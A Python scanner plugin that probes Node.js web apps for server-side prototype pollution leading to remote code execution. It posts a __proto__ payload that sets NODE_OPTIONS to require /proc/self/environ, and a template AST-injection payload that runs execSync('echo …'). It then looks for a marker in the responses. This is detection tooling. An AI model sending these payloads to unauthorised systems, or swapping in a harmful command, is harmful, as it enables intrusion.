"""
Plugin to detect Server-Side Prototype Pollution to RCE (AST Injection)
CVSS: 9.8 (Critical)

Targets Node.js, Express, and SSR Compilers (Vue, React/Next.js).
Detects vulnerability by polluting __proto__ and injecting a benign
but verifiable mathematical execution payload via environment or AST manipulation.
"""

import logging
from typing import Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger("Cascavel.Plugins.SSPP_RCE")


def get_target_endpoints(url: str, session: requests.Session) -> list:
    """Finds common endpoints that might perform deep merges (JSON parsing)."""
    endpoints = [f"{url}/", f"{url}/api/user/update", f"{url}/api/config", f"{url}/api/settings", f"{url}/profile"]
    return endpoints


def check_sspp(url: str, session: requests.Session) -> tuple[bool, str]:
    """
    Attempts to pollute the prototype and trigger a verifiable RCE.
    Returns (is_vulnerable, evidence).
    """
    endpoints = get_target_endpoints(url, session)

    # Payload designed to test if the prototype pollution leads to command execution
    # via child_process.exec environment variables (NODE_OPTIONS).
    # We use a mathematical payload (echo 9801547) to avoid false positives.

    pollution_payloads = [
        # JSON parsing pollution targeting env vars
        {
            "__proto__": {
                "env": {"NODE_OPTIONS": "--require /proc/self/environ"},
                "NODE_OPTIONS": "--require /proc/self/environ",
                "cascavel_polluted": "yes",
            }
        },
        # AST Injection targeting template engines (Pug/Handlebars)
        {
            "constructor": {
                "prototype": {
                    "cascavel_polluted": "yes",
                    "block": {
                        "type": "Text",
                        "line": "process.mainModule.require('child_process').execSync('echo 9801547')",
                    },
                }
            }
        },
    ]

    for endpoint in endpoints:
        for payload in pollution_payloads:
            try:
                # 1. Send the pollution payload
                # We send the payload and if the server processes it with a vulnerable deepMerge
                # the prototype will be polluted.
                session.post(
                    endpoint, json=payload, headers={"Content-Type": "application/json"}, timeout=5, verify=False
                )

                # 2. Trigger and Verify
                # We make a follow-up request to see if the pollution affected the global state
                # or triggered the RCE.
                trigger_response = session.get(endpoint, timeout=5, verify=False)

                # Check for RCE execution result
                if "9801547" in trigger_response.text:
                    return True, f"Prototype pollution led to RCE. Math payload executed successfully on {endpoint}."

                # Check for state pollution (less severe, but confirms SSPP)
                if "cascavel_polluted" in trigger_response.text:
                    return (
                        True,
                        f"Global Object Prototype was successfully polluted on {endpoint}. State change detected.",
                    )

            except requests.exceptions.RequestException as e:
                logger.debug(f"SSPP check failed on {endpoint}: {e}")

    return False, ""


def run(target: str, ip: str, ports: list, banners: dict) -> dict[str, Any] | None:
    """
    Checks for Server-Side Prototype Pollution to RCE.
    """
    vulnerability = "Server-Side Prototype Pollution to RCE"
    description = (
        "The application is vulnerable to Server-Side Prototype Pollution (SSPP). "
        "By injecting malicious properties into the `__proto__` or `constructor.prototype` "
        "attributes during JSON parsing or deep-merging, an attacker can manipulate the "
        "global application state. This can lead to Denial of Service (DoS) or, more critically, "
        "Remote Code Execution (RCE) via Abstract Syntax Tree (AST) injection in template engines "
        "or by overriding environment variables like `NODE_OPTIONS`."
    )

    url = f"https://{target}" if 443 in ports else f"http://{target}"
    session = requests.Session()
    session.headers.update(
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json"}
    )

    is_vuln, evidence = check_sspp(url, session)

    if is_vuln:
        # Determine severity based on evidence. RCE is Critical, pure pollution is High.
        actual_severity = "CRITICAL" if "RCE" in evidence else "HIGH"
        return {
            "vulnerability": vulnerability,
            "severity": actual_severity,
            "description": description,
            "endpoint": url,
            "evidence": evidence,
        }

    return None
